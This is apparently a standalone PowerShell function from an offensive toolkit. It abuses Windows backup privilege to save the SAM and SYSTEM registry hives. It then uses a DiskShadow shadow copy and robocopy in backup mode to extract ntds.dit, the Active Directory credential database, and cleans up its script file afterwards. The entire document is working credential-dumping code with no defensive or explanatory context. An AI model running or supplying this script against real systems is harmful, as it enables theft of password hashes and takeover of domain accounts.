function Invoke-BackupPrivilege {
    $Path = (Get-Location).Path
    reg save hklm\sam $PATH\SAM
    reg save hklm\system $PATH\SYSTEM
    $shadowScriptPath = "$Path\shadow.dsh"
    $diskshadowContent = @"
set context persistent nowriters
set metadata c:\windows\temp\file.cab
add volume c: alias mydrive
create
expose %mydrive% z:
"@
    Set-Content -Path $shadowScriptPath -Value $diskshadowContent -Force
    Write-Host "DiskShadow script written to $shadowScriptPath"
    if (Test-Path "c:\windows\ntds") {
        Write-Host "NTDS detected, Executing DiskShadow..."
        diskshadow /s $shadowScriptPath
        if (Test-Path "z:\windows\ntds") {
            Write-Host "Shadow copy detected. Running Robocopy to copy ntds.dit..."
            robocopy /b "z:\windows\ntds" $Path "ntds.dit"
        }
        else {
            Write-Error "Shadow copy not available on drive Z:. Please check DiskShadow output."
        }
        if (Test-Path $shadowScriptPath) {
            Remove-Item -Path $shadowScriptPath -Force
        }
        $ntdsPath = "$Path\ntds.dit"
        if (Test-Path $ntdsPath) {
            Rename-Item -Path $ntdsPath -NewName "NTDS" -Force
        }
        else {
            Write-Error "Failed to copy/rename NTDS."
        }
    }
    Write-Host "Operation completed."
}
